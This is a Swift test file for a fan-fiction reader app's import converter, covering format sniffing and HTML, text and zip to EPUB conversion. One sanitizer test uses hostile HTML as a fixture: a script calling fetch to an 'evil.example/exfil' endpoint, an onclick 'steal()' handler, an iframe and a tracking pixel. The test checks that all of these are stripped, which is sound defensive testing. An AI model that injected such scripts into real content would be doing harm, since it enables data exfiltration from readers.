import Foundation
import Testing
@testable import Kudos

/// Tests format sniffing and the HTML/text/zip → EPUB conversions against the
/// shapes fanfic actually circulates in.
///
/// Fixtures are built in-line rather than checked in, so each test states the
/// exact markup it depends on — these parsers exist to cope with other people's
/// files, and a test whose input you cannot see is not much of a guard.
struct ImportedDocumentConverterTests {
    private func write(_ contents: String, _ ext: String) throws -> URL {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString)
            .appendingPathExtension(ext)
        try Data(contents.utf8).write(to: url)
        return url
    }

    private func write(_ data: Data, _ ext: String) throws -> URL {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString)
            .appendingPathExtension(ext)
        try data.write(to: url)
        return url
    }

    /// Reads a converted archive back through the app's own EPUB stack.
    private func imported(_ outcome: ImportedDocumentConverter.Outcome) throws -> (EPUBMetadata, EPUBDocument) {
        guard case let .converted(data, _) = outcome else {
            throw ConversionTestError.expectedConvertedOutcome
        }
        let url = try write(data, "epub")
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let document = try EPUBDocument.open(epubURL: url, into: directory)
        let metadata = try EPUBDocument.metadata(ofEPUBAt: url)
        return (metadata, document)
    }

    private enum ConversionTestError: Error { case expectedConvertedOutcome }

    private func chapterText(_ document: EPUBDocument, _ index: Int) throws -> String {
        let data = try Data(contentsOf: document.spineURLs[index])
        return try #require(String(bytes: data, encoding: .utf8))
    }

    // MARK: - Format detection

    @Test func detectsAO3StyleHTMLRegardlessOfExtension() throws {
        // Reddit and Discord rename attachments, so the extension is a hint only.
        let url = try write("<!DOCTYPE html><html><body><p>Story</p></body></html>", "txt")
        #expect(ImportedFileFormat.detect(at: url) == .html)
    }

    @Test func detectsPlainTextAndMarkdown() throws {
        #expect(ImportedFileFormat.detect(at: try write("Just words.\n\nMore words.", "txt")) == .plainText)
        #expect(ImportedFileFormat.detect(at: try write("Prose, no markup at all.", "md")) == .plainText)
    }

    @Test func detectsEPUBEvenWhenRenamedToZip() throws {
        // The single most common disguise: forums reject .epub, so people zip it
        // or just rename it.
        let epub = try EPUBBuilder.archive(
            metadata: .init(title: "Renamed"),
            chapters: [.init(title: "One", bodyXHTML: "<p>x</p>")]
        )
        #expect(ImportedFileFormat.detect(at: try write(epub, "zip")) == .epub)
    }

    @Test func detectsFormatsDeferredToLaterTasks() throws {
        #expect(ImportedFileFormat.detect(at: try write("%PDF-1.7\nstuff", "pdf")) == .pdf)
        #expect(ImportedFileFormat.detect(at: try write("{\\rtf1\\ansi text}", "rtf")) == .rtf)
        #expect(ImportedFileFormat.detect(at: try write("Rar!\u{1A}\u{07}\u{00}", "rar")) == .rar)

        // A Palm database wearing MOBI's type/creator pair at offset 60.
        var mobi = Data(repeating: 0, count: 60)
        mobi.append(Data("BOOKMOBI".utf8))
        #expect(ImportedFileFormat.detect(at: try write(mobi, "mobi")) == .mobi)
    }

    @Test func deferredFormatsFailWithAnActionableMessage() throws {
        // RTF, not PDF: PDF converts for real since T-157, so it is no longer an
        // example of a deferred format. A dead end must still name the format and
        // say what to do about it.
        let url = try write("{\\rtf1\\ansi Some text}", "rtf")
        #expect(throws: ImportedDocumentConverter.ConversionError.notYetSupported(.rtf)) {
            _ = try ImportedDocumentConverter.convert(fileAt: url)
        }
        let message = ImportedDocumentConverter.ConversionError.notYetSupported(.rtf).errorDescription ?? ""
        #expect(message.contains("RTF"))
        #expect(message.lowercased().contains("epub"))
    }

    @Test func pdfIsNoLongerTreatedAsADeferredFormat() throws {
        // Guards the T-157 contract change from being silently reverted.
        #expect(ImportedFileFormat.pdf.isConvertible)
        let url = try write("%PDF-1.7\nnot a real pdf body", "pdf")
        // A corrupt PDF now fails as a *PDF* problem rather than "come back later".
        #expect(throws: ImportedDocumentConverter.ConversionError.pdfUnreadable) {
            _ = try ImportedDocumentConverter.convert(fileAt: url)
        }
    }

    @Test func anEPUBIsImportedUnconvertedRatherThanRebuilt() throws {
        // Re-encoding a real EPUB would be lossy for no reason, and would break
        // dedup against a copy already in the library.
        let epub = try EPUBBuilder.archive(
            metadata: .init(title: "Untouched"),
            chapters: [.init(title: "One", bodyXHTML: "<p>x</p>")]
        )
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(epub, "epub"))
        guard case .alreadyEPUB = outcome else {
            Issue.record("expected .alreadyEPUB, got \(outcome)")
            return
        }
    }

    // MARK: - AO3 HTML download

    /// The shape AO3's own "Download → HTML" produces.
    private static let ao3HTML = """
    <!DOCTYPE html><html lang="en"><head><title>A Rescued Work - SomeAuthor \
    [Archive of Our Own]</title></head><body>
      <h1 class="title">A Rescued Work</h1>
      <h3 class="byline"><a rel="author" href="/users/SomeAuthor">SomeAuthor</a></h3>
      <div class="summary"><blockquote>They meet again.</blockquote></div>
      <dl class="tags">
        <dt class="fandom">Fandom:</dt><dd class="fandom tags"><a class="tag">Some Fandom</a></dd>
        <dt class="freeform">Additional Tags:</dt><dd class="freeform tags"><a class="tag">Fluff</a></dd>
      </dl>
      <p>Source: https://archiveofourown.org/works/12345</p>
      <div id="chapters">
        <div class="chapter"><h2 class="heading">Chapter 1: Beginning</h2><p>First chapter text.</p></div>
        <div class="chapter"><h2 class="heading">Chapter 2: Ending</h2><p>Second chapter text.</p></div>
      </div>
    </body></html>
    """

    @Test func ao3HTMLDownloadSplitsIntoItsOwnChapters() throws {
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(Self.ao3HTML, "html"))
        let (metadata, document) = try imported(outcome)

        #expect(metadata.title == "A Rescued Work")
        #expect(metadata.author == "SomeAuthor")
        #expect(metadata.summary == "They meet again.")
        #expect(document.spineURLs.count == 2)
        #expect(document.chapters.map(\.title) == ["Chapter 1: Beginning", "Chapter 2: Ending"])
        #expect(try chapterText(document, 0).contains("First chapter text."))
        #expect(try chapterText(document, 1).contains("Second chapter text."))
    }

    @Test func ao3HTMLKeepsTheWorkURLSoAO3IdentitySurvivesConversion() throws {
        // This is what lets a converted file still resolve to an ao3WorkID and get
        // its tags refreshed from the live work page.
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(Self.ao3HTML, "html"))
        let (metadata, _) = try imported(outcome)
        #expect(metadata.sourceURL == "https://archiveofourown.org/works/12345")
        #expect(WorkTags.ao3WorkID(from: metadata.sourceURL) == 12345)
    }

    @Test func ao3TagsBecomeSubjects() throws {
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(Self.ao3HTML, "html"))
        let (metadata, _) = try imported(outcome)
        #expect(metadata.subjects.contains("Some Fandom"))
        #expect(metadata.subjects.contains("Fluff"))
    }

    @Test func archiveSuffixIsStrippedFromABareTitleTag() throws {
        // No <h1 class="title">, so the <title> tag is all there is — and it ends
        // with the archive's own suffix.
        let html = "<html><head><title>Bare Title - Author [Archive of Our Own]</title></head>"
            + "<body><p>Text.</p></body></html>"
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(html, "html"))
        let (metadata, _) = try imported(outcome)
        #expect(metadata.title == "Bare Title - Author")
    }

    // MARK: - fanfiction.net

    @Test func fanfictionNetSaveUsesItsStoryTextAndSelectedChapter() throws {
        let html = """
        <html><head><title>FFN Story</title></head><body>
          <select id="chap_select"><option>1. Start</option><option selected>2. Middle</option></select>
          <div id="storytext"><p>FFN chapter body.</p></div>
        </body></html>
        """
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(html, "html"))
        let (_, document) = try imported(outcome)
        #expect(document.spineURLs.count == 1)
        #expect(document.chapters.first?.title == "2. Middle")
        #expect(try chapterText(document, 0).contains("FFN chapter body."))
    }

    // MARK: - Sanitizing

    @Test func scriptsAndHandlersAndRemoteImagesAreStripped() throws {
        // The whole point: this markup came from a stranger on a forum and will be
        // rendered by a WebView.
        let html = """
        <html><body><div id="chapters"><div class="chapter"><h2>Ch 1</h2>
          <p onclick="steal()">Clickable prose.</p>
          <script>fetch('https://evil.example/exfil')</script>
          <iframe src="https://evil.example"></iframe>
          <img src="https://tracker.example/pixel.gif"/>
          <p style="color:red">Styled prose.</p>
        </div></div></body></html>
        """
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(html, "html"))
        let (_, document) = try imported(outcome)
        let text = try chapterText(document, 0)

        #expect(text.contains("Clickable prose."))
        #expect(text.contains("Styled prose."))
        #expect(!text.contains("script"))
        #expect(!text.contains("onclick"))
        #expect(!text.contains("iframe"))
        #expect(!text.contains("evil.example"))
        // Images are dropped rather than kept: a remote src would make the reader
        // call a stranger's server on every page turn.
        #expect(!text.contains("tracker.example"))
        #expect(!text.contains("<img"))
        // Inline styles go too — the reader owns typography and theming.
        #expect(!text.contains("color:red"))
    }

    @Test func aPageWithNoProseIsRejectedRatherThanImportedBlank() throws {
        let html = "<html><body><script>renderApp()</script></body></html>"
        #expect(throws: (any Error).self) {
            _ = try ImportedDocumentConverter.convert(fileAt: try self.write(html, "html"))
        }
    }

    // MARK: - Plain text

    @Test func plainTextSplitsOnChapterHeadings() throws {
        let text = """
        Chapter 1: The Start

        First paragraph, line one
        and its continuation.

        Second paragraph.

        Chapter 2: The End

        Final paragraph.
        """
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(text, "txt"))
        let (_, document) = try imported(outcome)

        #expect(document.chapters.map(\.title) == ["Chapter 1: The Start", "Chapter 2: The End"])
        let first = try chapterText(document, 0)
        // Hard-wrapped lines join into one paragraph; blank lines separate them.
        #expect(first.contains("<p>First paragraph, line one and its continuation.</p>"))
        #expect(first.contains("<p>Second paragraph.</p>"))
    }

    @Test func proseMentioningAChapterNumberIsNotASplitPoint() throws {
        let text = """
        She read chapter 3 of the manual, then chapter 4, and sighed at what
        chapter 5 implied.

        Then she slept.
        """
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(text, "txt"))
        let (_, document) = try imported(outcome)
        #expect(document.spineURLs.count == 1)
    }

    @Test func wordNumberedChaptersSplitToo() throws {
        // "Chapter One" is common enough in fanfic that missing it would leave a
        // whole work as one chapter.
        let text = """
        Chapter One

        Opening.

        Chapter Two - Rising

        Middle.
        """
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(text, "txt"))
        let (_, document) = try imported(outcome)
        #expect(document.chapters.map(\.title) == ["Chapter One", "Chapter Two - Rising"])
    }

    @Test func plainTextEscapesMarkupCharacters() throws {
        let outcome = try ImportedDocumentConverter.convert(
            fileAt: try write("5 < 6 & \"quoted\" <not a tag>", "txt")
        )
        let (_, document) = try imported(outcome)
        let body = try chapterText(document, 0)
        #expect(body.contains("&lt;") && body.contains("&amp;"))
        #expect(!body.contains("<not a tag>"))
    }

    @Test func emptyFileIsRejected() throws {
        #expect(throws: (any Error).self) {
            _ = try ImportedDocumentConverter.convert(fileAt: try self.write("   \n\n  ", "txt"))
        }
    }

    // MARK: - Archives

    @Test func zipOfChapterFilesBecomesOneWorkInNaturalOrder() throws {
        // Deliberately unpadded numbering: string sorting would put 10 before 2.
        let zip = try MiniZip.archiveData([
            ("chapter-1.txt", Data("Chapter one body.".utf8)),
            ("chapter-2.txt", Data("Chapter two body.".utf8)),
            ("chapter-10.txt", Data("Chapter ten body.".utf8)),
            ("__MACOSX/._chapter-1.txt", Data("resource fork junk".utf8)),
            (".DS_Store", Data("junk".utf8))
        ])
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(zip, "zip"))
        let (_, document) = try imported(outcome)

        #expect(document.spineURLs.count == 3)
        #expect(try chapterText(document, 0).contains("Chapter one body."))
        #expect(try chapterText(document, 1).contains("Chapter two body."))
        #expect(try chapterText(document, 2).contains("Chapter ten body."))
    }

    @Test func zipContainingAnEPUBYieldsThatEPUBUnchanged() throws {
        let inner = try EPUBBuilder.archive(
            metadata: .init(title: "Nested Work", author: "Nested Author"),
            chapters: [.init(title: "Only", bodyXHTML: "<p>Inner text.</p>")]
        )
        let zip = try MiniZip.archiveData([
            ("readme.txt", Data("Posted by a kind stranger.".utf8)),
            ("Nested Work.epub", inner)
        ])
        let outcome = try ImportedDocumentConverter.convert(fileAt: try write(zip, "zip"))
        guard case let .converted(data, from) = outcome else {
            Issue.record("expected converted outcome")
            return
        }
        // Byte-identical: the nested EPUB is extracted, never re-encoded.
        #expect(data == inner)
        #expect(from == .epub)
    }

    @Test func zipWithNothingReadableFails() throws {
        let zip = try MiniZip.archiveData([("cover.bin", Data([0x00, 0x01, 0x02]))])
        #expect(throws: ImportedDocumentConverter.ConversionError.archiveHasNoReadableFiles) {
            _ = try ImportedDocumentConverter.convert(fileAt: try self.write(zip, "zip"))
        }
    }

    @Test func naturalOrderSortsUnpaddedChapterNumbers() {
        let sorted = ["ch-10.txt", "ch-2.txt", "ch-1.txt"]
            .sorted(by: ImportedDocumentConverter.naturalOrder)
        #expect(sorted == ["ch-1.txt", "ch-2.txt", "ch-10.txt"])
    }
}
